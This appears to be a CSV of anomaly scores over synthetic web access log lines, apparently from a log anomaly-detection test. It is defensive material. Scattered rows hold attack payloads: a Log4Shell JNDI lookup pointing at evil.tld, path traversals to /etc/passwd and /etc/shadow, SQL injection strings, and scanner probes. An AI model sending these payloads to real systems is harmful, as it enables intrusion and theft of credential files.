score_content,score_session,score_fused,score_fused_norm,line
4.725849628448486,,4.725849628448486,4.725849628448486,247.231.231.231 - - [10/Jan/2025:12:41:16 +0000] "POST /contact HTTP/1.1" 200 4817 "https://news.ycombinator.com/" "nikto/2.5.0"
30166.720703125,,30166.720703125,30166.720703125,199.113.143.28 - - [10/Jan/2025:12:41:19 +0000] "POST /search?q=camera HTTP/1.1" 404 671 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
27.32110595703125,,27.32110595703125,27.32110595703125,105.27.64.41 - - [10/Jan/2025:12:41:21 +0000] "DELETE /logout HTTP/1.1" 200 1997 "https://www.google.com/" "Wget/1.21.2 (linux-gnu)"
72.7187728881836,,72.7187728881836,72.7187728881836,243.240.35.2 - - [10/Jan/2025:12:41:23 +0000] "OPTIONS /profile HTTP/1.1" 200 16887 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
3.1890366077423096,,3.1890366077423096,3.1890366077423096,149.138.15.105 - - [10/Jan/2025:12:41:23 +0000] "GET /index.html HTTP/1.1" 301 13077 "https://twitter.com/" "dirb/2.22"
72.72364044189453,,72.72364044189453,72.72364044189453,52.133.216.14 - - [10/Jan/2025:12:41:25 +0000] "OPTIONS /contact HTTP/1.1" 200 18820 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
69.39041900634766,,69.39041900634766,69.39041900634766,98.78.116.199 - - [10/Jan/2025:12:41:27 +0000] "HEAD /search?q=headphones HTTP/1.1" 200 6308 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
4.698841571807861,,4.698841571807861,4.698841571807861,126.48.137.142 - - [10/Jan/2025:12:41:29 +0000] "POST /api/products HTTP/1.1" 200 10949 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.28738999366760254,,0.28738999366760254,0.28738999366760254,34.214.25.202 - - [10/Jan/2025:12:41:31 +0000] "GET /.git/config HTTP/1.1" 200 827 "https://twitter.com/" "dirb/2.22"
94.96941375732422,,94.96941375732422,94.96941375732422,214.95.26.13 - - [10/Jan/2025:12:41:32 +0000] "OPTIONS /search?q=headphones HTTP/1.1" 200 14444 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
35.54084014892578,,35.54084014892578,35.54084014892578,214.43.247.64 - - [10/Jan/2025:12:41:35 +0000] "PUT /api/product?id=123 HTTP/1.1" 200 8319 "-" "Wget/1.21.2 (linux-gnu)"
106.80286407470703,,106.80286407470703,106.80286407470703,46.184.36.130 - - [10/Jan/2025:12:41:36 +0000] "TRACE /profile HTTP/1.1" 301 3339 "https://twitter.com/" "Wget/1.21.2 (linux-gnu)"
30141.71875,,30141.71875,30141.71875,195.13.152.252 - - [10/Jan/2025:12:41:38 +0000] "GET /admin HTTP/1.1" 401 105 "https://example.com/" "curl/7.85.0"
27.06205940246582,,27.06205940246582,27.06205940246582,76.220.127.163 - - [10/Jan/2025:12:41:38 +0000] "POST /search?q=camera HTTP/1.1" 200 8188 "-" "sqlmap/1.7.2#stable"
5.188348293304443,,5.188348293304443,5.188348293304443,175.144.39.24 - - [10/Jan/2025:12:41:39 +0000] "GET / HTTP/1.1" 301 16875 "https://twitter.com/" "curl/7.85.0"
2.297022581100464,,2.297022581100464,2.297022581100464,8.128.34.219 - - [10/Jan/2025:12:41:41 +0000] "GET / HTTP/1.1" 200 5210 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
13.124124526977539,,13.124124526977539,13.124124526977539,83.58.66.62 - - [10/Jan/2025:12:41:42 +0000] "PUT /api/products HTTP/1.1" 200 10205 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
95.10615539550781,,95.10615539550781,95.10615539550781,25.8.118.218 - - [10/Jan/2025:12:41:42 +0000] "OPTIONS /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/1.1" 201 2551 "https://twitter.com/" "python-requests/2.31.0"
30152.880859375,,30152.880859375,30152.880859375,11.244.226.166 - - [10/Jan/2025:12:41:42 +0000] "PUT /login HTTP/1.1" 404 1104 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
35.47469711303711,,35.47469711303711,35.47469711303711,178.61.252.41 - - [10/Jan/2025:12:41:45 +0000] "PUT /search?q=monitor HTTP/1.1" 200 10067 "https://twitter.com/" "nikto/2.5.0"
70.86278533935547,,70.86278533935547,70.86278533935547,179.76.69.187 - - [10/Jan/2025:12:41:48 +0000] "OPTIONS /cgi-bin/test.cgi HTTP/1.1" 200 16145 "https://www.google.com/" "python-requests/2.31.0"
27.098718643188477,,27.098718643188477,27.098718643188477,77.38.191.155 - - [10/Jan/2025:12:41:50 +0000] "POST /search?q=phone HTTP/1.1" 200 12621 "https://news.ycombinator.com/" "dirb/2.22"
35.46784210205078,,35.46784210205078,35.46784210205078,200.67.126.125 - - [10/Jan/2025:12:41:53 +0000] "PUT /search?q=monitor HTTP/1.1" 200 7958 "-" "python-requests/2.31.0"
75.54551696777344,,75.54551696777344,75.54551696777344,190.81.111.199 - - [10/Jan/2025:12:41:53 +0000] "OPTIONS /dashboard HTTP/1.1" 304 7364 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
129.30792236328125,,129.30792236328125,129.30792236328125,126.80.241.11 - - [10/Jan/2025:12:41:55 +0000] "TRACE /search?q=ssd HTTP/1.1" 304 19557 "https://www.google.com/" "Wget/1.21.2 (linux-gnu)"
1.852320909500122,,1.852320909500122,1.852320909500122,3.42.151.189 - - [10/Jan/2025:12:41:58 +0000] "GET /server-status HTTP/1.1" 200 13463 "https://www.google.com/" "nikto/2.5.0"
24.377965927124023,,24.377965927124023,24.377965927124023,181.25.47.7 - - [10/Jan/2025:12:41:58 +0000] "GET /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 1918 "-" "dirb/2.22"
45.27544403076172,,45.27544403076172,45.27544403076172,35.193.224.160 - - [10/Jan/2025:12:41:59 +0000] "HEAD /../../etc/passwd HTTP/1.1" 200 1714 "https://www.google.com/" "sqlmap/1.7.2#stable"
72.7864990234375,,72.7864990234375,72.7864990234375,228.147.164.164 - - [10/Jan/2025:12:41:59 +0000] "OPTIONS /login HTTP/1.1" 200 14469 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
72.64999389648438,,72.64999389648438,72.64999389648438,30.218.44.213 - - [10/Jan/2025:12:42:02 +0000] "OPTIONS /dashboard HTTP/1.1" 200 16382 "https://example.com/" "nikto/2.5.0"
13.073256492614746,,13.073256492614746,13.073256492614746,214.140.40.179 - - [10/Jan/2025:12:42:05 +0000] "PUT /phpmyadmin HTTP/1.1" 200 10446 "https://twitter.com/" "nikto/2.5.0"
0.33156147599220276,,0.33156147599220276,0.33156147599220276,254.125.252.209 - - [10/Jan/2025:12:42:07 +0000] "GET /index.html HTTP/1.1" 200 12502 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
2.3396618366241455,,2.3396618366241455,2.3396618366241455,211.19.63.95 - - [10/Jan/2025:12:42:10 +0000] "GET / HTTP/1.1" 200 19715 "https://example.com/" "dirb/2.22"
27.322080612182617,,27.322080612182617,27.322080612182617,241.246.27.212 - - [10/Jan/2025:12:42:10 +0000] "DELETE /contact HTTP/1.1" 200 15617 "-" "Wget/1.21.2 (linux-gnu)"
2.3173282146453857,,2.3173282146453857,2.3173282146453857,2.160.226.40 - - [10/Jan/2025:12:42:12 +0000] "GET / HTTP/1.1" 200 11464 "https://news.ycombinator.com/" "dirb/2.22"
49.975852966308594,,49.975852966308594,49.975852966308594,231.66.213.202 - - [10/Jan/2025:12:42:14 +0000] "HEAD /api/products HTTP/1.1" 302 8538 "-" "Wget/1.21.2 (linux-gnu)"
0.15229225158691406,,0.15229225158691406,0.15229225158691406,59.104.84.213 - - [10/Jan/2025:12:42:16 +0000] "GET /cgi-bin/test.cgi HTTP/1.1" 200 3782 "https://www.google.com/" "dirb/2.22"
25.38439178466797,,25.38439178466797,25.38439178466797,49.233.63.116 - - [10/Jan/2025:12:42:19 +0000] "DELETE /..%2f..%2fetc%2fpasswd HTTP/1.1" 200 17896 "https://www.google.com/" "nikto/2.5.0"
0.2550522983074188,,0.2550522983074188,0.2550522983074188,144.174.133.112 - - [10/Jan/2025:12:42:22 +0000] "GET /assets/app.js HTTP/1.1" 200 14933 "-" "python-requests/2.31.0"
24.307477951049805,,24.307477951049805,24.307477951049805,79.128.12.136 - - [10/Jan/2025:12:42:25 +0000] "GET /search?q=monitor HTTP/1.1" 200 3549 "-" "nikto/2.5.0"
49.65041732788086,,49.65041732788086,49.65041732788086,81.178.188.224 - - [10/Jan/2025:12:42:28 +0000] "DELETE /search?q=laptop HTTP/1.1" 200 16413 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30144.185546875,,30144.185546875,30144.185546875,89.11.43.247 - - [10/Jan/2025:12:42:30 +0000] "POST /api/products HTTP/1.1" 400 552 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
25.38359260559082,,25.38359260559082,25.38359260559082,29.239.205.242 - - [10/Jan/2025:12:42:30 +0000] "DELETE /..%2f..%2fetc%2fpasswd HTTP/1.1" 200 17581 "https://www.google.com/" "curl/7.85.0"
104.02960968017578,,104.02960968017578,104.02960968017578,140.55.169.105 - - [10/Jan/2025:12:42:31 +0000] "TRACE /about HTTP/1.1" 200 708 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
2.092589855194092,,2.092589855194092,2.092589855194092,145.231.68.22 - - [10/Jan/2025:12:42:32 +0000] "GET /admin HTTP/1.1" 200 779 "https://www.google.com/" "python-requests/2.31.0"
0.19433552026748657,,0.19433552026748657,0.19433552026748657,42.195.11.194 - - [10/Jan/2025:12:42:35 +0000] "GET /assets/app.css HTTP/1.1" 200 2614 "https://twitter.com/" "sqlmap/1.7.2#stable"
13.152975082397461,,13.152975082397461,13.152975082397461,112.181.100.60 - - [10/Jan/2025:12:42:36 +0000] "PUT /profile HTTP/1.1" 200 4661 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
129.17864990234375,,129.17864990234375,129.17864990234375,68.173.215.151 - - [10/Jan/2025:12:42:38 +0000] "TRACE /search?q=phone HTTP/1.1" 301 12410 "https://news.ycombinator.com/" "python-requests/2.31.0"
27.058042526245117,,27.058042526245117,27.058042526245117,6.113.32.11 - - [10/Jan/2025:12:42:40 +0000] "POST /search?q=laptop HTTP/1.1" 200 6983 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
2.316143274307251,,2.316143274307251,2.316143274307251,85.174.231.199 - - [10/Jan/2025:12:42:40 +0000] "GET / HTTP/1.1" 200 11077 "https://www.google.com/" "curl/7.85.0"
24.42145538330078,,24.42145538330078,24.42145538330078,16.180.57.156 - - [10/Jan/2025:12:42:43 +0000] "GET /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 18030 "https://www.google.com/" "python-requests/2.31.0"
2.3023464679718018,,2.3023464679718018,2.3023464679718018,224.128.153.3 - - [10/Jan/2025:12:42:44 +0000] "GET / HTTP/1.1" 200 951 "-" "curl/7.85.0"
69.48336791992188,,69.48336791992188,69.48336791992188,108.135.76.51 - - [10/Jan/2025:12:42:45 +0000] "HEAD /search?q=router HTTP/1.1" 200 12132 "https://twitter.com/" "dirb/2.22"
50.10964584350586,,50.10964584350586,50.10964584350586,103.175.220.181 - - [10/Jan/2025:12:42:45 +0000] "HEAD /login HTTP/1.1" 302 12585 "https://www.google.com/" "python-requests/2.31.0"
3.182962656021118,,3.182962656021118,3.182962656021118,249.48.109.77 - - [10/Jan/2025:12:42:47 +0000] "GET /index.html HTTP/1.1" 302 5013 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
11064.9091796875,,11064.9091796875,11064.9091796875,202.234.67.100 - - [10/Jan/2025:12:42:48 +0000] "PUT /search?q=headphones HTTP/1.1" 502 306 "https://www.google.com/" "Wget/1.21.2 (linux-gnu)"
30166.95703125,,30166.95703125,30166.95703125,242.30.146.231 - - [10/Jan/2025:12:42:50 +0000] "DELETE /dashboard HTTP/1.1" 403 87 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
2.3241970539093018,,2.3241970539093018,2.3241970539093018,103.74.123.253 - - [10/Jan/2025:12:42:52 +0000] "GET / HTTP/1.1" 200 13799 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
2.099940061569214,,2.099940061569214,2.099940061569214,232.79.29.194 - - [10/Jan/2025:12:42:52 +0000] "GET /login HTTP/1.1" 204 12899 "https://twitter.com/" "nikto/2.5.0"
70.94646453857422,,70.94646453857422,70.94646453857422,147.198.104.64 - - [10/Jan/2025:12:42:53 +0000] "OPTIONS /.git/config HTTP/1.1" 200 3230 "https://example.com/" "python-requests/2.31.0"
27.29450225830078,,27.29450225830078,27.29450225830078,74.69.106.89 - - [10/Jan/2025:12:42:56 +0000] "DELETE /contact HTTP/1.1" 204 8647 "https://www.google.com/" "sqlmap/1.7.2#stable"
102.2349624633789,,102.2349624633789,102.2349624633789,193.142.8.131 - - [10/Jan/2025:12:42:58 +0000] "TRACE /.git/config HTTP/1.1" 200 13429 "https://example.com/" "nikto/2.5.0"
30152.837890625,,30152.837890625,30152.837890625,194.111.26.143 - - [10/Jan/2025:12:43:01 +0000] "PUT /login HTTP/1.1" 403 1119 "-" "python-requests/2.31.0"
27.2968692779541,,27.2968692779541,27.2968692779541,159.83.223.8 - - [10/Jan/2025:12:43:03 +0000] "GET /api/product?id=123 HTTP/1.1" 304 1474 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
69.4781265258789,,69.4781265258789,69.4781265258789,153.84.163.205 - - [10/Jan/2025:12:43:03 +0000] "HEAD /search?q=phone HTTP/1.1" 200 2200 "-" "curl/7.85.0"
0.33797144889831543,,0.33797144889831543,0.33797144889831543,139.238.144.94 - - [10/Jan/2025:12:43:05 +0000] "GET /index.html HTTP/1.1" 200 14746 "https://news.ycombinator.com/" "curl/7.85.0"
27.102222442626953,,27.102222442626953,27.102222442626953,185.243.223.239 - - [10/Jan/2025:12:43:05 +0000] "DELETE /server-status HTTP/1.1" 200 2280 "https://example.com/" "nikto/2.5.0"
30152.751953125,,30152.751953125,30152.751953125,245.129.43.208 - - [10/Jan/2025:12:43:08 +0000] "PUT /admin HTTP/1.1" 401 1440 "-" "dirb/2.22"
0.2219293713569641,,0.2219293713569641,0.2219293713569641,136.72.140.106 - - [10/Jan/2025:12:43:08 +0000] "GET /assets/app.css HTTP/1.1" 200 11914 "https://news.ycombinator.com/" "curl/7.85.0"
2.3143584728240967,,2.3143584728240967,2.3143584728240967,150.221.132.180 - - [10/Jan/2025:12:43:10 +0000] "GET / HTTP/1.1" 200 10502 "https://twitter.com/" "Wget/1.21.2 (linux-gnu)"
30234.619140625,,30234.619140625,30234.619140625,85.97.192.100 - - [10/Jan/2025:12:43:12 +0000] "OPTIONS /search?q=ssd HTTP/1.1" 400 314 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
27.06928253173828,,27.06928253173828,27.06928253173828,131.9.246.182 - - [10/Jan/2025:12:43:13 +0000] "POST /search?q=camera HTTP/1.1" 200 10426 "https://twitter.com/" "sqlmap/1.7.2#stable"
72.78189086914062,,72.78189086914062,72.78189086914062,241.51.187.84 - - [10/Jan/2025:12:43:14 +0000] "OPTIONS /about HTTP/1.1" 200 12844 "https://example.com/" "dirb/2.22"
4.766999244689941,,4.766999244689941,4.766999244689941,70.31.40.117 - - [10/Jan/2025:12:43:15 +0000] "POST /contact HTTP/1.1" 200 18602 "https://example.com/" "sqlmap/1.7.2#stable"
0.2675553560256958,,0.2675553560256958,0.2675553560256958,65.3.122.58 - - [10/Jan/2025:12:43:16 +0000] "GET /assets/app.js HTTP/1.1" 200 19801 "-" "curl/7.85.0"
126.35407257080078,,126.35407257080078,126.35407257080078,172.15.101.170 - - [10/Jan/2025:12:43:19 +0000] "TRACE /search?q=ssd HTTP/1.1" 200 1020 "https://www.google.com/" "sqlmap/1.7.2#stable"
4.833829879760742,,4.833829879760742,4.833829879760742,39.219.232.235 - - [10/Jan/2025:12:43:22 +0000] "POST /login HTTP/1.1" 200 15771 "https://www.google.com/" "nikto/2.5.0"
27.36815643310547,,27.36815643310547,27.36815643310547,158.115.79.4 - - [10/Jan/2025:12:43:22 +0000] "DELETE /logout HTTP/1.1" 200 19474 "-" "python-requests/2.31.0"
49.5948600769043,,49.5948600769043,49.5948600769043,237.37.169.137 - - [10/Jan/2025:12:43:22 +0000] "DELETE /search?q=monitor HTTP/1.1" 200 5161 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
49.648094177246094,,49.648094177246094,49.648094177246094,225.195.140.191 - - [10/Jan/2025:12:43:22 +0000] "DELETE /search?q=router HTTP/1.1" 200 15541 "https://twitter.com/" "dirb/2.22"
2.1152234077453613,,2.1152234077453613,2.1152234077453613,44.65.194.92 - - [10/Jan/2025:12:43:25 +0000] "GET /login HTTP/1.1" 200 15904 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.23237009346485138,,0.23237009346485138,0.23237009346485138,199.43.84.35 - - [10/Jan/2025:12:43:26 +0000] "GET /assets/app.css HTTP/1.1" 200 15581 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
29.90812873840332,,29.90812873840332,29.90812873840332,25.225.152.95 - - [10/Jan/2025:12:43:26 +0000] "POST /search?q=camera HTTP/1.1" 301 5257 "https://news.ycombinator.com/" "curl/7.85.0"
29.968177795410156,,29.968177795410156,29.968177795410156,52.124.184.50 - - [10/Jan/2025:12:43:28 +0000] "POST /search?q=router HTTP/1.1" 304 5399 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
47.098976135253906,,47.098976135253906,47.098976135253906,154.22.209.76 - - [10/Jan/2025:12:43:30 +0000] "HEAD /api/products HTTP/1.1" 200 9096 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
45.196739196777344,,45.196739196777344,45.196739196777344,116.229.27.74 - - [10/Jan/2025:12:43:33 +0000] "HEAD /..%2f..%2fetc%2fpasswd HTTP/1.1" 200 7799 "-" "sqlmap/1.7.2#stable"
75.53400421142578,,75.53400421142578,75.53400421142578,27.25.4.166 - - [10/Jan/2025:12:43:35 +0000] "OPTIONS /phpmyadmin HTTP/1.1" 304 13709 "-" "dirb/2.22"
27.243101119995117,,27.243101119995117,27.243101119995117,229.189.205.222 - - [10/Jan/2025:12:43:35 +0000] "GET /search?q=laptop HTTP/1.1" 304 2103 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
26.974273681640625,,26.974273681640625,26.974273681640625,151.100.109.71 - - [10/Jan/2025:12:43:38 +0000] "POST /search?q=headphones HTTP/1.1" 200 3959 "-" "Wget/1.21.2 (linux-gnu)"
69.47059631347656,,69.47059631347656,69.47059631347656,196.103.22.69 - - [10/Jan/2025:12:43:40 +0000] "HEAD /search?q=laptop HTTP/1.1" 200 802 "https://news.ycombinator.com/" "dirb/2.22"
11.421562194824219,,11.421562194824219,11.421562194824219,187.117.72.197 - - [10/Jan/2025:12:43:40 +0000] "PUT /wp-login.php HTTP/1.1" 200 12746 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
47.153255462646484,,47.153255462646484,47.153255462646484,223.140.56.5 - - [10/Jan/2025:12:43:41 +0000] "HEAD /profile HTTP/1.1" 200 11514 "https://www.google.com/" "nikto/2.5.0"
95.02185821533203,,95.02185821533203,95.02185821533203,228.101.195.231 - - [10/Jan/2025:12:43:41 +0000] "OPTIONS /search?q=monitor HTTP/1.1" 200 14195 "https://www.google.com/" "nikto/2.5.0"
24.27106285095215,,24.27106285095215,24.27106285095215,110.139.102.30 - - [10/Jan/2025:12:43:41 +0000] "GET /search?q=headphones HTTP/1.1" 200 8856 "https://www.google.com/" "sqlmap/1.7.2#stable"
30.118501663208008,,30.118501663208008,30.118501663208008,82.130.141.86 - - [10/Jan/2025:12:43:43 +0000] "DELETE /dashboard HTTP/1.1" 301 18281 "https://example.com/" "python-requests/2.31.0"
13.106173515319824,,13.106173515319824,13.106173515319824,186.20.216.25 - - [10/Jan/2025:12:43:44 +0000] "PUT /api/products HTTP/1.1" 200 4711 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
38.39059066772461,,38.39059066772461,38.39059066772461,90.78.128.20 - - [10/Jan/2025:12:43:44 +0000] "PUT /search?q=phone HTTP/1.1" 302 9010 "https://news.ycombinator.com/" "nikto/2.5.0"
30140.005859375,,30140.005859375,30140.005859375,97.11.118.91 - - [10/Jan/2025:12:43:46 +0000] "GET /assets/app.js HTTP/1.1" 401 22 "https://www.google.com/" "nikto/2.5.0"
30152.73828125,,30152.73828125,30152.73828125,145.95.152.152 - - [10/Jan/2025:12:43:47 +0000] "PUT /contact HTTP/1.1" 401 235 "https://news.ycombinator.com/" "python-requests/2.31.0"
49.4967041015625,,49.4967041015625,49.4967041015625,180.45.108.174 - - [10/Jan/2025:12:43:47 +0000] "DELETE /search?q=%27+OR+1%3D1+-- HTTP/1.1" 200 8155 "https://twitter.com/" "curl/7.85.0"
104.01146697998047,,104.01146697998047,104.01146697998047,83.21.76.247 - - [10/Jan/2025:12:43:49 +0000] "TRACE /login HTTP/1.1" 200 3620 "https://www.google.com/" "dirb/2.22"
49.610939025878906,,49.610939025878906,49.610939025878906,185.105.221.166 - - [10/Jan/2025:12:43:51 +0000] "DELETE /search?q=camera HTTP/1.1" 200 1965 "https://news.ycombinator.com/" "python-requests/2.31.0"
129.1436004638672,,129.1436004638672,129.1436004638672,80.222.61.24 - - [10/Jan/2025:12:43:51 +0000] "TRACE /search?q=headphones HTTP/1.1" 304 13217 "https://news.ycombinator.com/" "nikto/2.5.0"
2.078159809112549,,2.078159809112549,2.078159809112549,64.18.84.143 - - [10/Jan/2025:12:43:51 +0000] "GET /login HTTP/1.1" 201 4547 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
4.769418716430664,,4.769418716430664,4.769418716430664,249.16.15.115 - - [10/Jan/2025:12:43:52 +0000] "POST /logout HTTP/1.1" 200 7060 "https://www.google.com/" "sqlmap/1.7.2#stable"
30209.0546875,,30209.0546875,30209.0546875,205.146.198.230 - - [10/Jan/2025:12:43:55 +0000] "HEAD /api/user?id=1;DROP TABLE users HTTP/1.1" 401 671 "https://example.com/" "nikto/2.5.0"
27.232269287109375,,27.232269287109375,27.232269287109375,59.239.224.4 - - [10/Jan/2025:12:43:56 +0000] "DELETE /dashboard HTTP/1.1" 200 8152 "-" "python-requests/2.31.0"
69.4383544921875,,69.4383544921875,69.4383544921875,188.13.34.202 - - [10/Jan/2025:12:43:59 +0000] "HEAD /search?q=monitor HTTP/1.1" 200 4692 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
2.0235655307769775,,2.0235655307769775,2.0235655307769775,87.192.169.24 - - [10/Jan/2025:12:44:01 +0000] "GET /contact HTTP/1.1" 200 655 "https://news.ycombinator.com/" "curl/7.85.0"
126.34121704101562,,126.34121704101562,126.34121704101562,8.208.134.149 - - [10/Jan/2025:12:44:04 +0000] "TRACE /search?q=phone HTTP/1.1" 200 19246 "https://twitter.com/" "curl/7.85.0"
95.04918670654297,,95.04918670654297,95.04918670654297,141.253.154.125 - - [10/Jan/2025:12:44:06 +0000] "OPTIONS /search?q=camera HTTP/1.1" 200 393 "https://example.com/" "sqlmap/1.7.2#stable"
13.261603355407715,,13.261603355407715,13.261603355407715,164.236.108.143 - - [10/Jan/2025:12:44:09 +0000] "PUT /about HTTP/1.1" 200 410 "https://example.com/" "sqlmap/1.7.2#stable"
47.19705581665039,,47.19705581665039,47.19705581665039,23.118.109.6 - - [10/Jan/2025:12:44:10 +0000] "HEAD /logout HTTP/1.1" 200 467 "https://twitter.com/" "sqlmap/1.7.2#stable"
47.22853088378906,,47.22853088378906,47.22853088378906,169.141.98.232 - - [10/Jan/2025:12:44:13 +0000] "HEAD /about HTTP/1.1" 200 11883 "-" "python-requests/2.31.0"
3.039029598236084,,3.039029598236084,3.039029598236084,236.61.7.83 - - [10/Jan/2025:12:44:13 +0000] "POST /.git/config HTTP/1.1" 200 19211 "-" "python-requests/2.31.0"
30163.869140625,,30163.869140625,30163.869140625,144.217.107.228 - - [10/Jan/2025:12:44:15 +0000] "GET /search?q=headphones HTTP/1.1" 403 1499 "https://twitter.com/" "curl/7.85.0"
27.320404052734375,,27.320404052734375,27.320404052734375,112.2.149.51 - - [10/Jan/2025:12:44:17 +0000] "DELETE /logout HTTP/1.1" 200 2670 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
46.963623046875,,46.963623046875,46.963623046875,208.46.19.141 - - [10/Jan/2025:12:44:18 +0000] "HEAD /server-status HTTP/1.1" 200 9118 "https://news.ycombinator.com/" "nikto/2.5.0"
38.35102844238281,,38.35102844238281,38.35102844238281,181.106.253.248 - - [10/Jan/2025:12:44:21 +0000] "PUT /search?q=camera HTTP/1.1" 302 1735 "-" "Wget/1.21.2 (linux-gnu)"
49.66987609863281,,49.66987609863281,49.66987609863281,96.20.6.31 - - [10/Jan/2025:12:44:23 +0000] "DELETE /api/product?id=123 HTTP/1.1" 200 6147 "https://www.google.com/" "sqlmap/1.7.2#stable"
2.7716634273529053,,2.7716634273529053,2.7716634273529053,250.94.122.254 - - [10/Jan/2025:12:44:23 +0000] "POST /..%2f..%2fetc%2fpasswd HTTP/1.1" 204 2962 "https://www.google.com/" "dirb/2.22"
